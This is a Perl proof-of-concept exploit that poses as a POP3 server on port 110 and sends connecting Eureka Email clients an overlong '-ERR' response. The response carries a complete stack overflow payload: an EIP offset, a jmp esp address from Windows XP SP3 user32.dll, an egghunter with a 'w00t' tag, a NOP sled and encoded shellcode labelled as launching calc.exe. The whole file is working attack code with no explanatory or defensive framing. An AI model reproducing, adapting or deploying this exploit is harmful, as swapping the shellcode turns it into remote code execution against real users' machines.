use Socket;
#fill out the local IP or hostname
#which is used by Eureka EMail as POP3 server
#note : must be exact match !

my $localserver = "192.168.0.165";
#calculate offset to EIP
my $junk = "A" x (723 - length($localserver));
my $ret=pack('V',0x7E47BCBF);  #jmp esp from user32.dll XP SP3
#my $break = "\xcc" x 300;
my $padding = "\x90" x 1000;
my $egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

#calc.exe
my $shellcode="\xba\x0e\xbf\x4d\x4e\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9" .
"\xb1\x57\x83\xc6\x04\x31\x56\x0e\x03\x58\xb1\xaf\xbb\x98" .
"\x25\xad\x44\x60\xb6\xd2\xcd\x85\x87\xd2\xaa\xce\xb8\xe2" .
"\xb9\x82\x34\x88\xec\x36\xce\xfc\x38\x39\x67\x4a\x1f\x74" .
"\x78\xe7\x63\x17\xfa\xfa\xb7\xf7\xc3\x34\xca\xf6\x04\x28" .
"\x27\xaa\xdd\x26\x9a\x5a\x69\x72\x27\xd1\x21\x92\x2f\x06" .
"\xf1\x95\x1e\x99\x89\xcf\x80\x18\x5d\x64\x89\x02\x82\x41" .
"\x43\xb9\x70\x3d\x52\x6b\x49\xbe\xf9\x52\x65\x4d\x03\x93" .
"\x42\xae\x76\xed\xb0\x53\x81\x2a\xca\x8f\x04\xa8\x6c\x5b" .
"\xbe\x14\x8c\x88\x59\xdf\x82\x65\x2d\x87\x86\x78\xe2\xbc" .
"\xb3\xf1\x05\x12\x32\x41\x22\xb6\x1e\x11\x4b\xef\xfa\xf4" .
"\x74\xef\xa4\xa9\xd0\x64\x48\xbd\x68\x27\x05\x72\x41\xd7" .
"\xd5\x1c\xd2\xa4\xe7\x83\x48\x22\x44\x4b\x57\xb5\xdd\x5b" .
"\x68\x69\x65\x0b\x96\x89\x96\x05\x5d\xdd\xc6\x3d\x74\x5d" .
"\x8d\xbd\x79\x88\x38\xb4\xed\xf2\x15\xc8\x48\x9a\x67\xc9" .
"\x83\x06\xe1\x2f\xf3\xe6\xa1\xff\xb4\x56\x02\x50\x5d\xbc" .
"\x8d\x8f\x7d\xbf\x47\xb8\x14\x2f\x3e\x90\x80\xd6\x1b\x6a" .
"\x30\x17\xb6\x16\x72\x93\x33\xe6\x3d\x53\x31\xf4\x2a\x04" .
"\xb9\x04\xab\xa0\xb9\x6e\xaf\x62\xed\x06\xad\x53\xd9\x88" .
"\x4e\xb6\x59\xce\xb1\x46\x68\xa4\x84\xdc\xd4\xd2\xe8\x30" .
"\xd5\x22\xbf\x5a\xd5\x4a\x67\x3e\x86\x6f\x68\xeb\xba\x23" .
"\xfd\x13\xeb\x90\x56\x7b\x11\xce\x91\x24\xea\x25\xa2\x22" .
"\x14\xbb\x8d\x8a\x7d\x43\x8e\x2a\x7e\x29\x0e\x7a\x16\xa6" .
"\x21\x75\xd6\x47\xe8\xde\x7e\xcd\x7d\xad\x1f\xd2\x57\x73" .
"\xbe\xd3\x54\xaf\x31\xa9\x15\x50\xb2\x4e\x3c\x35\xb2\x4e" .
"\x40\x48\x8e\x98\x79\x3f\xd1\x18\x3e\x41\xdf\xac\xab\xd7" .
"\xe0\x83\xd4\xf2\x8b\x23\xe8";

my $payload=$junk.$ret.$egghunter.$padding."w00tw00t".$shellcode;

#set up listener on port 110
my $port=110;
my $proto=getprotobyname('tcp');
socket(SERVER,PF_INET,SOCK_STREAM,$proto);
my $paddr=sockaddr_in($port,INADDR_ANY);
bind(SERVER,$paddr);
listen(SERVER,SOMAXCONN);
print "[+] Listening on tcp port 110 [POP3]... \n";
print "[+] Configure Eureka Mail Client to connect to this host\n";
my $client_addr;
while($client_addr=accept(CLIENT,SERVER))
{
  print "[+] Client connected, sending evil payload\n";
  while(1)
  {
     print CLIENT "-ERR ".$payload."\n";
  }
}
close CLIENT;
print "[+] Connection closed\n";
